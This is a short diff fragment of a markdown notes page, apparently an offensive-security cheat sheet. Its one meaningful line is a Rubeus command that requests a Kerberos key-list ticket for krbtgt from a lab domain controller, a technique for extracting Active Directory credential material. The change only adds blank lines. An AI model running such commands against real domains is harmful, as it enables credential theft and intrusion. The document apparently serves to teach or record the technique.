@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:10.988131+00:00'
 ```bash
 Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM=
 ```
+
+
